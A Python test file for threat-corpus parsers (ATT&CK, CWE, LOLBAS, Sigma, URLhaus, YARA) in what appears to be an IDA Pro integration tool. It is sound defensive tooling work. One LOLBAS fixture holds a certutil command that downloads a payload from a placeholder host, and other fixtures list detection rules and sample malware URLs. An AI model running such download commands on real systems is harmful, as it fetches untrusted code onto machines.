"""Behavioral tests for the threat-corpus source parsers.

Each SourceParser normalizes a downloaded corpus (STIX bundles, CWE XML,
LOLBAS JSON, Sigma YAML, URLhaus JSON, YARA rule trees) into uniform entry
dicts.  These tests drive parse() with small fixture files — no network, no
IDA, no real corpus required.
"""
from __future__ import annotations

import io
import json
import zipfile

from ida_pro_mcp.host.intelligence.sources import (
    AttackSource,
    CweSource,
    FindCryptSource,
    LolbasSource,
    SigmaRulesSource,
    SourceParser,
    UrlhausSource,
    YaraRulesExtraSource,
    YaraSource,
)

STIX_BUNDLE = {
    "type": "bundle",
    "objects": [
        {
            "type": "attack-pattern",
            "id": "attack-pattern--1",
            "name": "Spearphishing Attachment",
            "description": "Send a malicious attachment.",
            "external_references": [
                {"source_name": "mitre-attack", "external_id": "T1566.001"},
            ],
            "kill_chain_phases": [{"kill_chain_name": "mitre-attack", "phase_name": "initial-access"}],
            "x_mitre_platforms": ["Windows", "Linux"],
            "x_mitre_aliases": ["Spearphish"],
            "x_mitre_is_subtechnique": True,
        },
        {
            "type": "malware",
            "id": "malware--2",
            "name": "TrickBot",
            "description": "Banking trojan.",
            "external_references": [
                {"source_name": "mitre-attack", "external_id": "S0266"},
            ],
            "x_mitre_platforms": ["Windows"],
        },
        {
            "type": "attack-pattern",
            "id": "attack-pattern--revoked",
            "name": "Old Pattern",
            "description": "Revoked.",
            "revoked": True,
            "external_references": [
                {"source_name": "mitre-attack", "external_id": "T0000"},
            ],
        },
        {
            "type": "tool",
            "id": "tool--3",
            "name": "Mimikatz",
            "description": "Credential dumper.",
            "external_references": [
                {"source_name": "mitre-attack", "external_id": "S0002"},
            ],
        },
    ],
}

CWE_XML = """<?xml version="1.0" encoding="UTF-8"?>
<Weakness_Catalog xmlns:cwe="http://cwe.mitre.org/cwe-7">
  <Weaknesses>
    <cwe:Weakness ID="119" Name="Improper Restriction of Operations within the Bounds of a Memory Buffer" Status="Incomplete" Abstraction="Class">
      <cwe:Description>Write past the end of a buffer.</cwe:Description>
      <cwe:Background_Details>
        <cwe:Background_Detail>Memory corruption is common in C.</cwe:Background_Detail>
      </cwe:Background_Details>
      <cwe:Applicable_Platforms>
        <cwe:Language Class="Language-C" Name="C">C</cwe:Language>
        <cwe:Language Class="Language-CPP" Name="C++">C++</cwe:Language>
        <cwe:Technology Name="x86">x86</cwe:Technology>
      </cwe:Applicable_Platforms>
      <cwe:Common_Consequences>
        <cwe:Consequence>
          <cwe:Scope>Integrity</cwe:Scope>
          <cwe:Technical_Impact>Modify memory</cwe:Technical_Impact>
        </cwe:Consequence>
      </cwe:Common_Consequences>
    </cwe:Weakness>
    <cwe:Weakness ID="999" Name="Deprecated Weakness" Status="Deprecated">
      <cwe:Description>Should not appear.</cwe:Description>
    </cwe:Weakness>
  </Weaknesses>
</Weakness_Catalog>
"""

LOLBAS_JSON = [
    {
        "Name": "certutil.exe",
        "Description": "Download and decode payloads.",
        "Full_Path": "C:\\Windows\\System32\\certutil.exe",
        "Commands": [
            {
                "Command": "certutil -urlcache -f http://host/x payload",
                "Description": "Download",
                "Category": "Download",
                "Privilege": "User",
                "MitreID": "T1105, T1105",
            },
        ],
    },
]

SIGMA_RULE = """title: Suspicious PowerShell Invocation
id: 5b2f5b4c-6c1a-4b2e-9b0a-123456789abc
status: experimental
level: high
description: Detects suspicious powershell.exe invocation
tags:
    - sigma.rule
    - attack.execution
logsource:
    category: process_creation
detection:
    selection:
        Image|endswith: powershell.exe
    condition: selection
"""

YARA_RULE = """rule suspicious_tool_usage
{
    meta:
        description = "Detects a suspicious tool"
        author = "test"
        reference = "https://example.com"
    strings:
        $a = "suspicious"
        $b = { 6a 20 41 42 43 }
    condition:
        any of them
}
"""


def _write(tmp_path, relpath: str, content: str):
    target = tmp_path / relpath
    target.parent.mkdir(parents=True, exist_ok=True)
    target.write_text(content, encoding="utf-8")
    return str(target)


class TestAttackSource:
    def test_parses_stix_bundle_and_tags_type(self, tmp_path):
        _write(tmp_path, "enterprise-attack.json", json.dumps(STIX_BUNDLE))
        entries = AttackSource().parse(str(tmp_path))
        by_type = {e["name"]: e for e in entries}
        assert "T1566.001" in by_type["Spearphishing Attachment"]["id"]
        assert by_type["Spearphishing Attachment"]["_attack_type"] == "attack_patterns"
        assert by_type["Spearphishing Attachment"]["tactics"] == ["initial-access"]
        assert by_type["Spearphishing Attachment"]["is_subtechnique"] is True
        assert by_type["TrickBot"]["_attack_type"] == "malware"
        assert by_type["Mimikatz"]["_attack_type"] == "tools"
        assert "Old Pattern" not in by_type  # revoked objects are dropped

    def test_empty_dir_returns_empty(self):
        assert AttackSource().parse("/nonexistent") == []


class TestCweSource:
    def test_parses_cwe_xml(self, tmp_path):
        _write(tmp_path, "cwec.xml", CWE_XML)
        entries = CweSource().parse(str(tmp_path))
        assert len(entries) == 1  # deprecated entry dropped
        entry = entries[0]
        assert entry["id"] == "CWE-119"
        assert entry["name"].startswith("Improper Restriction")
        assert "Memory corruption" in entry["background"]
        assert entry["languages"] == ["C", "C++"]
        assert entry["technologies"] == ["x86"]
        assert entry["scopes"] == ["Integrity", "Modify memory"]
        assert entry["source"] == "cwe"

    def test_missing_xml_returns_empty(self):
        assert CweSource().parse("/nonexistent") == []

    def test_post_download_extracts_only_xml_members(self, tmp_path):
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w") as zf:
            zf.writestr("cwec_latest.xml", CWE_XML)
            zf.writestr("readme.txt", "ignore me")
        fpath = _write(tmp_path, "cwec_latest.xml.zip", "")
        with open(fpath, "wb") as fh:
            fh.write(buf.getvalue())
        CweSource()._post_download(fpath, str(tmp_path))
        assert (tmp_path / "cwec_latest.xml").exists()
        assert not (tmp_path / "readme.txt").exists()


class TestLolbasSource:
    def test_parses_entries_and_dedups_techniques(self, tmp_path):
        _write(tmp_path, "lolbas.json", json.dumps(LOLBAS_JSON))
        entries = LolbasSource().parse(str(tmp_path))
        assert len(entries) == 1
        entry = entries[0]
        assert entry["id"] == "LOLBAS-certutil.exe"
        assert entry["techniques"] == ["T1105"]
        assert entry["tactics"] == ["Download"]
        assert entry["commands"][0]["privilege"] == "User"
        assert entry["source"] == "lolbas"

    def test_bad_json_returns_empty(self, tmp_path):
        _write(tmp_path, "lolbas.json", "{not json")
        assert LolbasSource().parse(str(tmp_path)) == []


class TestSigmaRulesSource:
    def test_parses_fields(self, tmp_path):
        _write(tmp_path, "rules/proc_creation_win.yaml", SIGMA_RULE)
        entries = SigmaRulesSource().parse(str(tmp_path))
        assert len(entries) == 1
        entry = entries[0]
        assert entry["name"] == "Suspicious PowerShell Invocation"
        assert entry["id"].startswith("5b2f5b4c")
        assert entry["status"] == "experimental"
        assert entry["level"] == "high"
        assert "sigma.rule" in entry["tags"]
        assert entry["file"].endswith("proc_creation_win.yaml")

    def test_dedups_titles_across_files(self, tmp_path):
        _write(tmp_path, "rules/a.yaml", SIGMA_RULE)
        _write(tmp_path, "rules/b.yaml", SIGMA_RULE.replace("experimental", "stable"))
        _write(
            tmp_path,
            "rules/c.yaml",
            SIGMA_RULE.replace("title: Suspicious PowerShell Invocation", "title: Another Rule"),
        )
        entries = SigmaRulesSource().parse(str(tmp_path))
        assert len(entries) == 2  # a.yaml + b.yaml share a title; c.yaml is distinct

    def test_skips_oversized_rules(self, tmp_path):
        big = "title: Big Rule\n" + "description: x\n" + "# " + "a" * 500_000
        _write(tmp_path, "big.yaml", big)
        assert SigmaRulesSource().parse(str(tmp_path)) == []


class TestUrlhausSource:
    def test_parses_dict_and_list_shapes(self, tmp_path):
        _write(
            tmp_path,
            "urlhaus.json",
            json.dumps({"urls": [
                {"url": "http://evil.example/x", "threat": ["malware_download", "c2"], "dateadded": "2026-01-01"},
                {"url": "http://evil.example/x", "threat": "c2"},
                {"url": "http://second.example/y"},
                {"not_a_url": 1},
            ]}),
        )
        entries = UrlhausSource().parse(str(tmp_path))
        assert [e["url"] for e in entries] == ["http://evil.example/x", "http://second.example/y"]
        assert entries[0]["threat"] == "malware_download, c2"
        assert entries[0]["date_added"] == "2026-01-01"
        assert entries[0]["id"].startswith("URLHAUS-")

    def test_list_shape(self, tmp_path):
        _write(tmp_path, "feed.json", json.dumps([
            {"urlhaus_url": "http://a.example/1", "tags": "botnet"},
            {"url": "http://a.example/1"},
        ]))
        entries = UrlhausSource().parse(str(tmp_path))
        assert [e["url"] for e in entries] == ["http://a.example/1"]


class TestFindCryptSource:
    def test_parses_rule_names_and_descriptions(self, tmp_path):
        rules = YARA_RULE + "\nrule second_rule\n{\n  strings:\n    $a = \"x\"\n  condition:\n    $a\n}\n"
        _write(tmp_path, "rules/crypto.yar", rules)
        entries = FindCryptSource().parse(str(tmp_path))
        names = {e["name"]: e for e in entries}
        assert names["suspicious_tool_usage"]["display_name"] == "Detects a suspicious tool"
        assert names["second_rule"]["display_name"] == "second_rule"
        assert all(e["source"] == "findcrypt-yara" for e in entries)

    def test_ignores_symlinked_rule_files_and_directories(self, tmp_path):
        rules_dir = tmp_path / "rules"
        rules_dir.mkdir()
        outside = tmp_path / "outside"
        outside.mkdir()
        (outside / "outside.yar").write_text(YARA_RULE, encoding="utf-8")
        (rules_dir / "linked.yar").symlink_to(outside / "outside.yar")
        (rules_dir / "linked-dir").symlink_to(outside, target_is_directory=True)

        assert FindCryptSource().parse(str(rules_dir)) == []

    def test_parses_edge_cases_and_post_download(self, tmp_path, monkeypatch):
        # 1. Duplicate strings, duplicate rule name, and meta without description
        rules = (
            "rule edge_rule {\n"
            "  meta:\n"
            "    author = \"alice\"\n"
            "  strings:\n"
            "    $a = \"dup_str\"\n"
            "    $b = \"dup_str\"\n"
            "  condition:\n"
            "    $a\n"
            "}\n"
            "rule edge_rule {\n"
            "  condition: true\n"
            "}\n"
        )
        _write(tmp_path, "rules/edge.rules", rules)
        # Non-matching extension
        _write(tmp_path, "rules/notes.txt", "just notes")
        # Unreadable file triggering OSError
        _write(tmp_path, "rules/unreadable.yar", "rule bad { condition: true }")

        real_open = open

        def guarded_open(path, *args, **kwargs):
            if "unreadable.yar" in str(path):
                raise OSError("simulated unreadable file")
            return real_open(path, *args, **kwargs)

        monkeypatch.setattr("builtins.open", guarded_open)
        entries = FindCryptSource().parse(str(tmp_path))
        edge_entry = next((e for e in entries if e["name"] == "edge_rule"), None)
        assert edge_entry is not None
        assert edge_entry["display_name"] == "edge_rule"  # Fallback to rule_name
        assert edge_entry["strings"] == ["dup_str"]  # De-duplicated

        # 2. _post_download coverage
        extracted = []
        monkeypatch.setattr(
            "ida_pro_mcp.host.intelligence.sources.findcrypt_source.extract_findcrypt_rules",
            lambda z, d: extracted.append((z, d)),
        )
        src = FindCryptSource()
        src._post_download("rules.zip", "/dest")
        assert extracted == [("rules.zip", "/dest")]
        src._post_download("rules.tar", "/dest")
        assert len(extracted) == 1



class TestYaraSources:
    def test_yara_source_finds_signature_base_subdir(self, tmp_path):
        _write(tmp_path, "signature-base-master/yara/apt.yar", YARA_RULE)
        entries = YaraSource().parse(str(tmp_path))
        assert len(entries) == 1
        assert entries[0]["name"] == "suspicious_tool_usage"
        assert entries[0]["description"] == "Detects a suspicious tool"
        assert entries[0]["strings"] == ["suspicious"]  # quoted strings only

    def test_yara_rules_extra_uses_rules_master_subdir(self, tmp_path):
        _write(tmp_path, "rules-master/crypto/rule.yara", YARA_RULE)
        entries = YaraRulesExtraSource().parse(str(tmp_path))
        assert len(entries) == 1
        assert entries[0]["source"] == "yara_rules_extra"

    def test_yara_source_walks_flat_dir_fallback(self, tmp_path):
        _write(tmp_path, "rules/tool.yar", YARA_RULE)
        entries = YaraSource().parse(str(tmp_path))
        assert entries[0]["name"] == "suspicious_tool_usage"


class TestSourceParserBase:
    def test_fingerprint_stable_and_sensitive(self, tmp_path):
        parser = LolbasSource()
        _write(tmp_path, "lolbas.json", json.dumps(LOLBAS_JSON))
        fp1 = parser.fingerprint(str(tmp_path))
        fp2 = parser.fingerprint(str(tmp_path))
        assert fp1 == fp2
        _write(tmp_path, "lolbas.json", json.dumps([LOLBAS_JSON[0], LOLBAS_JSON[0]]))
        assert parser.fingerprint(str(tmp_path)) != fp1

    def test_fingerprint_missing_dir_is_stable(self):
        fp = LolbasSource().fingerprint("/nonexistent")
        assert len(fp) == 32
        assert fp == LolbasSource().fingerprint("/nonexistent")

    def test_download_writes_once_and_honors_force(self, monkeypatch, tmp_path):
        import ida_pro_mcp.host.intelligence.threat_corpus as tc

        monkeypatch.setattr(tc, "_download_url", lambda url: b"corpus bytes")

        class StubSource(SourceParser):
            name = "stub"
            description = "stub"
            cache_key = "stub"

            def __init__(self):
                self.urls = ["https://example.com/stub.json"]

            def parse(self, data_dir):
                return []

        dest = str(tmp_path / "corpus")
        result = StubSource().download(dest)
        assert result["downloaded"] == ["stub.json"]
        assert result["errors"] == []
        assert (tmp_path / "corpus" / "stub" / "stub.json").read_bytes() == b"corpus bytes"

        again = StubSource().download(dest)
        assert again["downloaded"] == []  # already present, no re-download

        forced = StubSource().download(dest, force=True)
        assert forced["downloaded"] == ["stub.json"]

    def test_download_reports_errors(self, monkeypatch, tmp_path):
        import ida_pro_mcp.host.intelligence.threat_corpus as tc

        def boom(url):
            raise OSError("network down")

        monkeypatch.setattr(tc, "_download_url", boom)

        class StubSource(SourceParser):
            name = "stub"
            description = "stub"
            cache_key = "stub"

            def __init__(self):
                self.urls = ["https://example.com/stub.json"]

            def parse(self, data_dir):
                return []

        result = StubSource().download(str(tmp_path / "corpus"))
        assert result["downloaded"] == []
        assert len(result["errors"]) == 1
        assert "network down" in result["errors"][0]
